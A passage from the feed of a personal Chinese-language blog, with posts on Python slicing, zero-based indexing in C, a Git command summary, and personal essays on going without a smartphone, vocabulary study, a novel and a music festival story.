class="string">&#x27;0123456789&#x27;</span>[<span class="number">2</span>:<span class="number">6</span>:<span class="number">1</span>] = <span class="string">&#x27;2345&#x27;</span></span><br></pre></td></tr></table></figure><p>如上例，我们想要的第一个值在第二个位置，第一个不想要的在第6个位置。</p><p>更进一步，我们从字符串末尾开始看：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[-<span class="number">8</span>:-<span class="number">4</span>] = <span class="string">&#x27;0123456789&#x27;</span>[-<span class="number">8</span>:-<span class="number">4</span>:<span class="number">1</span>] = <span class="string">&#x27;2345&#x27;</span></span><br></pre></td></tr></table></figure><p>我们想要的第一个值是从后数第8个（2），第一个不想要的是从后数第4个（6）。</p><p>所以，对于任意正数<code>step</code>，我们有如下的默认值：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">     |-&gt; -&gt; -&gt;|</span><br><span class="line">a = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">     ^         ^</span><br><span class="line">  start:<span class="number">0</span>   stop: <span class="built_in">len</span>(a), i.e, 超出了字符串的末尾的位置</span><br></pre></td></tr></table></figure><p>所以：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[:]    = a[<span class="number">0</span>:<span class="built_in">len</span>(a):<span class="number">1</span>] = <span class="string">&#x27;0123456789&#x27;</span> <span class="comment"># a +1 step 默认</span></span><br><span class="line">a[::<span class="number">2</span>]  = a[<span class="number">0</span>:<span class="built_in">len</span>(a):<span class="number">2</span>] = <span class="string">&#x27;02468&#x27;</span>      <span class="comment"># 所有偶数位置</span></span><br><span class="line">a[<span class="number">1</span>::<span class="number">2</span>] = <span class="string">&#x27;13579&#x27;</span>                      <span class="comment"># 所有奇数位置</span></span><br><span class="line">a[::<span class="number">3</span>]  = <span class="string">&#x27;0369&#x27;</span>                       <span class="comment"># 所有3的倍数位置</span></span><br></pre></td></tr></table></figure><p>所以，只要我们从字符串头部或者尾部使用切片，Python都会使用默认值。</p><p>** 如果<code>step</code>是负数，而我们从后往前数**</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[<span class="number">6</span>:<span class="number">2</span>:-<span class="number">1</span>] = <span class="string">&#x27;0123456789&#x27;</span>[<span class="number">6</span>:<span class="number">2</span>:-<span class="number">1</span>] = <span class="string">&#x27;6543&#x27;</span></span><br></pre></td></tr></table></figure><p>我们需要的第一个值在第六个位置，不需要的第一个值在第二个位置。</p><p>或者进一步，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[-<span class="number">4</span>:-<span class="number">8</span>:-<span class="number">1</span>] = <span class="string">&#x27;0123456789&#x27;</span>[-<span class="number">4</span>:-<span class="number">8</span>:-<span class="number">1</span>] = <span class="string">&#x27;6543&#x27;</span></span><br></pre></td></tr></table></figure><p>我们想要的第一个值是从后数第4个（6），第一个不想要的是从后数第8个（2）。</p><p>注意到我们可以在索引中使用正数或者负数，以及从前或者从后搜寻字符串，所以我们甚至可以将它们混合起来使用：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[<span class="number">6</span>:-<span class="number">8</span>:-<span class="number">1</span>] = <span class="string">&#x27;6543&#x27;</span></span><br><span class="line">a[-<span class="number">4</span>:<span class="number">2</span>:-<span class="number">1</span>] = <span class="string">&#x27;6543&#x27;</span></span><br></pre></td></tr></table></figure><p>有时候这样的混合式非常方便的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;&lt;a href=&quot;http://udacity.com&quot;&gt;&#x27;</span>[<span class="number">9</span>:-<span class="number">2</span>]</span><br><span class="line">    = <span class="string">&#x27;http://udacity.com&#x27;</span></span><br></pre></td></tr></table></figure><p>我们需要记住的是使用负数索引不意味着我们就是向后移动，只是我们从字符串末尾开始索引。向前还是向后是仅由step变量的符号决定的。</p><p>为了向后移动，我们需要在我们的意识中反转这个字符串：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">     |&lt;- &lt;- &lt;-|</span><br><span class="line">a = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">    ^         ^</span><br><span class="line">    ^      start:-<span class="number">1</span></span><br><span class="line">stop:在字符串开始位置之前的位置</span><br></pre></td></tr></table></figure><p>所以：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[::-<span class="number">1</span>] = a[-<span class="number">1</span>::-<span class="number">1</span>] = <span class="string">&#x27;9876543210&#x27;</span> <span class="comment"># 我们只是学习如何反转字符串</span></span><br><span class="line">a[::-<span class="number">2</span>] = a[-<span class="number">1</span>:-<span class="built_in">len</span>(a)-<span class="number">1</span>:-<span class="number">2</span>] = <span class="string">&#x27;97531&#x27;</span></span><br><span class="line">a[::-<span class="number">3</span>] = a[-<span class="number">1</span>:-<span class="built_in">len</span>(a)-<span class="number">1</span>:-<span class="number">3</span>] = <span class="string">&#x27;9630&#x27;</span></span><br></pre></td></tr></table></figure><p>再一次，只要我们从字符串的头部或者尾部对字符串切片，我们可以使用空的start和stop变量，Python会使用默认值。</p><p>只用6个字符就反转了一个字符串，厉害吧！可惜的是这个只在Python中有用，许多其他的语言并不支持这种方式。这类问题只是用来是我们熟悉这种结构，不只是在Python中，也包括其他语言在内。因此，考虑需要反转字符串的这类问题（比如回文问题）可以让我们学习如何使用循环，索引，并且尝试不同切片来解决这些问题。这样，你就有两手准备了。</p><hr><p>所以现在，我们已经掌握了Python的索引，应该能明白底下这些了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;0123456789&#x27;</span>[<span class="number">8</span>:<span class="number">2</span>:-<span class="number">2</span>]   = <span class="string">&#x27;864&#x27;</span></span><br><span class="line"><span class="string">&#x27;0123456789&#x27;</span>[<span class="number">8</span>:-<span class="number">8</span>:-<span class="number">2</span>]  = <span class="string">&#x27;864&#x27;</span></span><br><span class="line"><span class="string">&#x27;0123456789&#x27;</span>[-<span class="number">2</span>:<span class="number">2</span>:-<span class="number">2</span>]  = <span class="string">&#x27;864&#x27;</span></span><br><span class="line"><span class="string">&#x27;0123456789&#x27;</span>[-<span class="number">2</span>:-<span class="number">8</span>:-<span class="number">2</span>] = <span class="string">&#x27;864&#x27;</span></span><br></pre></td></tr></table></figure><p>Good luck!</p><p>原文在<a href="http://forums.udacity.com/questions/2017002/python-101-unit-1-understanding-indices-and-slicing">这儿</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      理解python索引和切片
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>为什么python中索引从0开始</title>
    <link href="https://qiwihui.com/qiwihui-blog-14/"/>
    <id>https://qiwihui.com/qiwihui-blog-14/</id>
    <published>2018-10-09T05:29:28.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>在Python中字符串索引从0开始而不是从1开始是合乎逻辑的选择，因为python是用C语言写的，做为C的主要数据结构，数组是从0开始索引的。这在C中是很基础的，以至于如果改变索引从1开始将会需要大量的工作。</p><span id="more"></span><p>** 1) 那么下一个问题：为什么在C中索引从0开始？**</p><p>C语言中的主要数据结构是数组，数组时一些相同类型元素的集合。在C中，字符串时字符数组，如果你想存储字符串“HELLO”，C会在内存中寻找一块连续的地方存储这些字符。比如，从内存地址7000开始存储，那么这个字符串在内存中的地址就是：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">7000</span> <span class="string">&#x27;H&#x27;</span></span><br><span class="line"><span class="number">7001</span> <span class="string">&#x27;E&#x27;</span></span><br><span class="line"><span class="number">7002</span> <span class="string">&#x27;L&#x27;</span></span><br><span class="line"><span class="number">7003</span> <span class="string">&#x27;L&#x27;</span></span><br><span class="line"><span class="number">7004</span> <span class="string">&#x27;O&#x27;</span></span><br><span class="line"><span class="number">7005</span> <span class="string">&#x27;/0&#x27;</span></span><br></pre></td></tr></table></figure><p>你可能会问：最后一个’/0’是什么？这个不是字符串&quot;HELLO&quot;的一部分。这个称作空值终止字符串。我们知道字符串从7000开始，但是我们不知道在哪里结束，因此C在字符串的末尾加了一个空值使得我们遍历字符串时知道它在哪里结束。让我们再回到原来的问题。</p><p>让我们认真看一下这些字符的地址，如果我们想要这个字符串的第一个字符，我们要做的就是得到这个字符串的初始内存地址。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;H&#x27;</span> 地址在 <span class="number">7000</span> 因为字符串从 <span class="number">7000</span> 开始</span><br></pre></td></tr></table></figure><p>如果我们要字符’E’，只需要地址偏移加1:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;E&#x27;</span> is at <span class="number">7000</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>我们可以是用偏移来得到所以的字符：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;H&#x27;</span> is at <span class="number">7000</span> + <span class="number">0</span></span><br><span class="line"><span class="string">&#x27;E&#x27;</span> is at <span class="number">7000</span> + <span class="number">1</span></span><br><span class="line"><span class="string">&#x27;L&#x27;</span> is at <span class="number">7000</span> + <span class="number">2</span></span><br><span class="line"><span class="string">&#x27;L&#x27;</span> is at <span class="number">7000</span> + <span class="number">3</span></span><br><span class="line"><span class="string">&#x27;O&#x27;</span> is at <span class="number">7000</span> + <span class="number">4</span></span><br></pre></td></tr></table></figure><p>啊哈！看到了吗？我们很自然地会使得索引等于便宜，这样我们就可以找到数组中的所有元素。如果我们赋值如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">greeting = <span class="string">&#x27;HELLO&#x27;</span></span><br></pre></td></tr></table></figure><p>则</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">greeting[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span></span><br><span class="line">greeting[<span class="number">1</span>] = <span class="string">&#x27;E&#x27;</span></span><br><span class="line">greeting[<span class="number">2</span>] = <span class="string">&#x27;L&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>所以，这是我们问题的回答。字符从0开始索引因为这表示了相对于字符串开始位置的偏移。</p><p>** 2) 我还是认为数组的第一个元素应该从1开始，这样错了吗？**</p><p>不，一点也不。有很多语言都会设计成这样：字符串的第一个元素的位置必须为1。一个很常见的例子是Matlab，它的索引从1开始。在这个例子中，Matlab是基于Fotran的，Fotran的数组索引从1开始，所以，改变时没有意义的。</p><p>看到趋势了吗？语言往往从他们的父辈中继承许多基本的特性。由C衍生出来的语言倾向于从0开始索引，比如C++，objective C，Java，Python， Perl，Javascript和其它许多语言，<a href="http://en.wikipedia.org/wiki/List_of_C-based_programming_languages">看这</a>。有Fortran衍生出来的语言则往往从1开始所以，就像Matalb和SimScript一样。</p><p>当然，这些继承不是必须的。比如，相对于其他许多C衍生的语言，Python使用缩进来表示结构，而不是花括号。恕我直言，这很不寻常，但也不失为一个好选择，因为为了清楚，结构里的语句也会缩进，从这点看，花括号或者其他分隔符都显得多余了。</p><p>** 3) 哪一个更好呢，从0开始还是从1开始？**</p><p>都不好。如果需要，使用另一个索引开始值也是相对简单的。然而，有一些算法自然是从0或者1开始的，没有其他的，所以对于这些情况下，在实现上略有不同。比如，二叉查找树从1开始，所以，在Python中，我们可以使用一个从0开始的数组活着列表，然后忽略第一个元素。在这篇<a href="http://forums.udacity.com/questions/2006322/where-python-is-illogical?page=1&amp;focusedAnswerId=2022504#2022504">博客</a>中，其中描述了我们可以强制C中的数组从1开始索引，以及C开发者社区是怎样收到一本趋势读者也这样做的书。</p><p>原文在<a href="http://forums.udacity.com/questions/100086491/why-does-indexing-begin-at-0?page=1&amp;focusedAnswerId=100086607#100086607">这儿</a>。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      为什么python中索引从0开始
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>Git 小结</title>
    <link href="https://qiwihui.com/qiwihui-blog-13/"/>
    <id>https://qiwihui.com/qiwihui-blog-13/</id>
    <published>2018-10-09T05:28:43.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>整理自<a href="http://www.cnblogs.com/tugenhua0707/p/4050072.html">手把手教你用git</a>.</p><span id="more"></span><ol><li><code>git reflog</code> 查看历史记录的版本号id</li><li>Discard:<ul><li><code>git reset --hard HEAD^</code></li><li><code>git reset --hard HEAD~100</code></li><li><code>git reset --hard &lt;one commit&gt;</code></li></ul></li><li><code>git checkout -- &lt;file&gt;</code><ul><li>修改后，还没有放到暂存区，使用 撤销修改就回到和版本库一模一样的状态。</li><li>另外一种是第一次修改已经放入暂存区了，接着又作了修改，撤销修改就回到添加暂存区后的状态。</li></ul></li><li>暂存区 -&gt; 工作区<ul><li><code>git reset HEAD &lt;file&gt;</code></li><li>HEAD严格来说不是指向提交，而是指向master，master才是指向提交的，所以，HEAD指向的就是当前分支。</li></ul></li><li>push<ul><li><code>git remote add origin https://github.com/username/project_name.git</code> 关联一个远程库</li><li><code>git push –u origin master</code> (第一次要用-u, 以后不需要)</li></ul></li><li>分支管理策略:<ul><li>通常合并分支时，git一般使用”Fast forward”模式，在这种模式下，删除分支后，会丢掉分支信息。可以使用带参数 –no-ff来禁用”Fast forward”模式。<code>git merge --no-ff -m &quot;comments&quot; &lt;branch_name&gt;</code></li><li>分支策略：首先master主分支应该是非常稳定的，也就是用来发布新版本，一般情况下不允许在上面干活，干活一般情况下在新建的dev分支上干活，干完后，比如上要发布，或者说dev分支代码稳定后可以合并到主分支master上来。</li></ul></li><li><code>git stash</code>: 可以把当前工作现场 ”隐藏起来”，等以后恢复现场后继续工作。<ul><li><code>git stash list</code>: 查看</li><li>恢复：<ol><li><code>git stash apply</code> 恢复，恢复后，stash内容并不删除，你需要使用命令<code>git stash drop</code>来删除。</li><li>另一种方式是使用<code>git stash pop</code>,恢复的同时把stash内容也删除了。</li></ol></li></ul></li><li>多人协作：<ul><li>推送分支：<ol><li>master分支是主分支，因此要时刻与远程同步。</li><li>一些修复bug分支不需要推送到远程去，可以先合并到主分支上，然后把主分支master推送到远程去。</li></ol></li><li>抓取分支：<ol><li>push非master分支(e.g. dev)：<code>git checkout –b dev origin/dev</code>, edit something, <code>git push origin dev</code></li><li>另一个同伴更新：<code>git branch --set-upstream dev origin/dev</code>, <code>git pull</code>, edit something, <code>git push origin dev</code></li></ol></li><li>协作模式：<ol><li>首先，可以试图用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改.</li><li>如果推送失败，则因为远程分支比你的本地更新早，需要先用git pull试图合并。</li><li>如果合并有冲突，则需要解决冲突，并在本地提交。再用<code>git push origin &lt;branch-name&gt;</code>推送。</li></ol></li></ul></li><li>delete remote branch<ul><li><code>git push origin —delete &lt;branch_name&gt;</code></li></ul></li><li>get remote branch locally<ul><li><code>git branch --set-upstream dev origin/dev</code></li></ul></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Git 小结
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>没有智能手机的第一天</title>
    <link href="https://qiwihui.com/qiwihui-blog-12/"/>
    <id>https://qiwihui.com/qiwihui-blog-12/</id>
    <published>2018-10-09T05:27:54.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>在停止博客的一个多月时间里，我除了上班的五天白天，再加上周末出去爬山的两天，剩下的时间很多都花在了我那只智能手机上，微信，QQ，G+，以及一些有节操和没节操的应用和游戏，这一个多月的时间就这样荒芜的度过了。</p><span id="more"></span><p>直到我暂停出行的计划，更多地和朋友接触，我才觉得，智能手机在给我带来很大方便的同时，也使得我的生活变得狭窄，交际变得狭隘。于是我决定：离开智能手机一到两个月，就像去年手机坏掉一样。</p><h2><span id="di-yi-tian"><strong>第一天</strong></span></h2><p>我把手机交给了朋友保管，在微信上和QQ上留下了电话和邮箱，开始了我一个月的非智能生活。第一天是很艰难的，尤其是在突然离开手机之后，我获取信息的方式直接转移到了电脑，这就意味着我要很多时候开着电脑，背单词，阅读文章，收邮件等等都从手机向电脑迁移，无可选择。</p><p>第一天计划的实施还是有点水分的，总是不自觉地拿起那台很古老的手机，打开又关闭，才能继续回来学习工作，然后在iPad上上了一会微信，然后删了微信，整理了所有的不需要的会上瘾的软件，这才算是正式开始了。</p><p>理了头发表决心。</p><h2><span id="ji-hua"><strong>计划</strong></span></h2><p>在接下来的一两个月的时间里，计划是这样的：</p><ul><li>单词 &gt;100个/天，英文文章&gt;5个/天，有扇贝网站管理。</li><li>linux + python + mysql</li><li>《一个陌生女人的来信》+《Lovely bone》(English) + 《小王子》等</li><li>锻炼： 开始我的为其50周的马拉松训练计划。</li><li>健康管理： 爬，坐，走，跑…</li><li>华山之行（九月份）。</li></ul><h2><span id="mu-biao"><strong>目标</strong></span></h2><blockquote><p>尽最大的诚意，但不知道何时会消失，如果可以，就不要<strong>再试一次</strong>。</p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      没有智能手机的第一天
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>Seek, think then speak</title>
    <link href="https://qiwihui.com/qiwihui-blog-11/"/>
    <id>https://qiwihui.com/qiwihui-blog-11/</id>
    <published>2018-10-09T05:27:20.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>“Seek, think then speak”，这是我在我的<a href="https://twitter.com/Weihui_Q">Twitter</a>上的签名，也是我在日常生活和工作中一个做事的基本准则。当自己得到一个消息，或者开始一个新的任务的时候，不是下意识地就相信这个消息，开始这个任务，而是要经过这三步过程之后，得出自己的结论，才开始行动。</p><span id="more"></span><h2><span id="seek"><strong>Seek</strong></span></h2><p>探索，或者说是寻求，就是当你得到这个消息的时候，不是盲目地相信，而是先开始收集和甄别资料。在这个信息化一直信息爆炸的时代，越来越多的误导和虚假消息充斥在我们的身边，新闻电视，媒体资讯，社交网络，信息方便的同时也可能是误导和虚假消息滋生的温床。信息本无对错，只是当它们被少数人利用，曲解的时候，信息的对错才开始变得有利可图。</p><h2><span id="think"><strong>Think</strong></span></h2><p>思考，结合自己的知识背景和收集到的信息，思考信息的对错，以及其中个所包含的其他有价值的信息，这是一步非常重要的过程。善恶只在一念之间，这一念就是你的思考，你的想法。思考，可以是道理更深刻，事物更透彻，思考的好处不言而喻，古今之集大成者，莫不是善于思考的人。</p><h2><span id="speak"><strong>Speak</strong></span></h2><p>发言，又或者可以是行动（Move），就是在思考之后表达自己的见解，采取一定的行动支持这个见解，以达到说服自己，说服别人，是别人达成对你的共识，就如同演讲家和行动派表现出来的一样。</p><p>我更喜欢诸如Twitter一类的自由开放社交工具，一个重要的原因是消息的对冲。QQ，微信之类的熟人社交，消息相对封闭，而且熟人会弱化我们对消息的思考，又如微博，却因别有用心的控制儿失去了本来的对冲能力。但这种情况发生的时候， “Seek，think then speak” 就变更加重要了。比如在MH370消失的三四后，微博上开始有人谣传MH370安全返航，微博上很快澄清，儿微信圈和QQ圈就无法及时跟上，seek在这个过程中让我没有轻易相信这这不实的信息。</p><p>Speak, 在这个容易因为言获罪的时期，发言和行动变得愈加重要。沉默是金，那是因为真理，对于非正义，speak才是真理。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Seek, think then speak
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="观点" scheme="https://qiwihui.com/tags/%E8%A7%82%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>《平凡的世界》与平凡的世界</title>
    <link href="https://qiwihui.com/qiwihui-blog-10/"/>
    <id>https://qiwihui.com/qiwihui-blog-10/</id>
    <published>2018-10-09T05:26:49.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>我今天要去两个书店淘书，万圣园和蓝羊书坊，便就想起了去年八月读过的小说《平凡的世界》。小说是万学教育的老师推荐的，在刚开始工作的第二个月了就发奋四个星期读完了，时至今日已经过去快一年了，可书中的许多情节依旧历历在目。</p><span id="more"></span><h2><span id="shu-zhong-de-gu-shi"><strong>书中的故事</strong></span></h2><p>《平凡的世界》讲述了以孙少安和孙少平为代表的普通人在大时代历史进程中走过的艰难曲折的道路。时间在上个实际70到80年代，从混乱到改革开放的时期，时代的变革深刻地影响这每一代人的命运。</p><p>哥哥少安一直在家劳动，与村支书田福堂的女儿田润叶青梅竹马，两人互有爱慕之心，却遭到田福堂的反对，经过痛苦的煎熬，少安与山西勤劳的姑娘秀莲结婚，润叶也只能含泪与倾慕她的李向前结婚，改革开放后，机灵的少安看到机会，先是带领生产对实施责任制，后又进城拉砖，用赚的钱办砖窑，成为冒尖户。</p><p>少平原来在县城高中读书，毕业后回乡做了一名老师，但他没有消沉，与县革委副主任田福军女儿田晓霞建立了友情，青春的梦想和追求也激励着他到外面去“闯荡世界”，他从漂泊的揽工汉成为正式的建筑工人，最后又获得了当煤矿工人的好机遇，而田晓霞毕业后也到省城成为了一名记者。在两人产生了强烈的感情时候，田晓霞却因在抗洪采访中为抢救灾民光荣牺牲，少平悲痛不已。后来少平在一次事故中毁容，他没有被不幸压跨，重新回到矿山迎接新的挑战。</p><h2><span id="ping-fan-de-shi-jie-li"><strong>平凡的世界里</strong></span></h2><p>《平凡的世界》是一部很长的小说，但是文字十分流畅，很快就可以带入我们进入这两个在黄土高原上闪亮的两个人的故事。在那个时代变革明显的时代，个人的命运也和时代的命运紧紧地联系在一起，与此同时，个人的追求和梦想也在一步一步地影响这他们的轨迹。少安看准了时代的先机，少平追求不一样的外面世界，这也深深地影响他们的命运和感情。</p><p>他们的感情都有着悲剧性的一面。少安与田润叶，少平与田晓霞，最终没能在一起，甚是惋惜。书中在许多细节上的描写令人感动，比如少平与少安相约两年之后再相见的那段，以及少平在得知田晓霞牺牲之后的感情变化，让人心中为之而动。</p><p>我喜欢书中提到的叶赛宁的一首诗：不惋惜，不呼唤，我也不啼哭……金黄的落叶堆满我心间，我已经不再是青春少年……</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      《平凡的世界》与平凡的世界
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>扇贝300天小记：坚持的力量</title>
    <link href="https://qiwihui.com/qiwihui-blog-9/"/>
    <id>https://qiwihui.com/qiwihui-blog-9/</id>
    <published>2018-10-09T05:25:12.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>到今天，我已经在<a href="http://www.shanbay.com">扇贝</a>网上完成了300+天的背单词和阅读文章, 单词量虽然不算很多，但是在这过程中的感想还是值得分享的。</p><span id="more"></span><p>我喜欢道家之数“三”，道家曰：一生二，二生三，三生万物。天下之事情有三而生，即是刚刚开始，故而在300天左右的时候是很适合分享的。</p><h2><span id="qi-yin-he-jian-chi-de-dong-li"><strong>起因和坚持的动力</strong></span></h2><p>背单词的最初起因里带有种愤，气愤，大体就是成为前女友眼中的“极品前任”。虽然这在最出的几天很激励，但是这种感觉很快就消失了，之间有一段迷茫期，不知到自己为什么背单词。直到有一天我找到了另一种坚持，一个自己一直想去的地方：Multnomah Falls，这是在美国Oregon这州的一个瀑布，我被她绚丽的落差所折服，有生之年不然是要前往的，虽然觉得去旅游和背单词不是很搭边，没什么联系。</p><p>就是这个，犹如在远方等待着我的少女，让我坚持到了现在：</p><p><img src="https://user-images.githubusercontent.com/3297411/45277890-077a9600-b4fd-11e8-936b-5e6e4d6f98a5.jpg" alt="06-multnomahfalls"></p><h2><span id="fang-fa"><strong>方法</strong></span></h2><p>扇贝网是我知道的为数不多的几个背单词的网站，除了单词，还有新闻文章，书籍，以及一起背单词的小组和论坛，这在一定程度上激励着你一直坚持背下去，小组的作用更加的明显，不打卡就踢人的制度很合适。对单词的单词的理解程度也完全靠自己的自觉。</p><h2><span id="gan-shou"><strong>感受</strong></span></h2><p>背单词最大的感受是你不能只背单词，只背单词如同嚼蜡，刚开始就会觉得很舒服，没有营养又损害身体，带来的效果也很小。单词背的同时结合着文章的阅读效果是很明显的，以前老师常说的在语境中理解单词的含义单体就是这个意思。其次是要让自己处在一种英语的氛围中，可以用英语阅读写文章，使用英文和朋友交流，使用英文的办公环境…如此种种，都是很有效果的。再者，别人和自己的经验告诉我：背单词应该是意见很快乐的事情，如果在这个过程过程中觉得很痛苦，那么是应该考虑一下自己的方法了。</p><p>李笑来在《把时间当作朋友中》中提到了背单词的方法：</p><blockquote><p>在背单词的时候，事实上，在做所有类似的必须记住大量信息的工作的时候，一定要想办法由衷地把这件事当成一件快乐的事情来做。</p><p>我的一个朋友曾跟我分享他的做法：当年他终于搞明白要拿到奖学金就得获得GRE高分的时候，背单词量要求吓了一跳。他说，他用两天才说服自己这应该是件快乐的事情。</p><p>一共要搞定20000个单词，而因此可能获得的奖学金是40000美元左右 且连续4年没有失业的可能，那么每个单词就值20元人民币，这还只不过是算了一年的收入而已。</p><p>所以，他终于明白背单词是很快乐的，他每天都强迫自己背下200个单词，每在确定记住了一个单词前面画上一个勾时，他就想象一下刚刚数过一张20元人民币的钞票。每天睡觉的时候总感觉心满意足，因为今天又赚了4000块！</p></blockquote><p>在这样的坚持了300+天以后，我觉得在更多的地方都体会到了一个坚持力量（很鸡汤的一句话），但是确实是，坚持锻炼，或者开始每天/每两天更新一千字博客。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      扇贝300天小记：坚持的力量
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="总结" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>One small story by Fan Zhang at GMIC 2014</title>
    <link href="https://qiwihui.com/qiwihui-blog-8/"/>
    <id>https://qiwihui.com/qiwihui-blog-8/</id>
    <published>2018-10-09T05:23:57.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>I attended GMIC 2014 in Beijing at May 5<sup>th</sup> and May 6<sup>th</sup>.GMIC is short for Global Mobile Internet Conference, and it is a really huge conference.I just want to share a small story I heard in the conference.</p><span id="more"></span><h2><span id="0x00"><strong>0x00</strong></span></h2><p>In WeTalk Stage, one of the 8 stages, Fan Zhang, who is the brain behind<a href="http://en.wikipedia.org/wiki/Midi_Music_Festival">Midi Modern Music Festival</a>, gave us a speech: Listen to the Original Where Music is Eternal.In the speech, he shared us a song named “The Brightest Star in the Sky” of 2013 Shanghai Midi Festival(watch it <a href="https://www.youtube.com/watch?v=Z7qgMJCmAHs">here</a>), and told us a story about the boywho was singing with tears at 2:31 in the video.</p><iframe width="560" height="315" src="//www.youtube.com/embed/Z7qgMJCmAHs" frameborder="0" allowfullscreen></iframe><p>The boy met his girlfriend when they are student in college,but they got separated after graduation and went back to their own hometown. It was the first time they saw each otherafter 2 years. When catching this song, the boy couldn’t stop crying with mixed feeling.</p><p>This is what music means that something in your deep heart and express your real feeling, I think.</p><p>I would like to go to Midi festival the next time in Beijing, and listen to this song.</p><h2><span id="0x01"><strong>0x01</strong></span></h2><p><a href="http://smileboxx.blogspot.com/2013/08/escape-plan-brightest-star-in-night-sky.html">Here</a> is the song&quot;The Brightest Star in the Sky&quot; in English. Hope you like it.</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      One small story by Fan Zhang at GMIC 2014
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>年度总结 - 2017年</title>
    <link href="https://qiwihui.com/qiwihui-blog-7/"/>
    <id>https://qiwihui.com/qiwihui-blog-7/</id>
    <published>2018-10-09T05:21:40.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
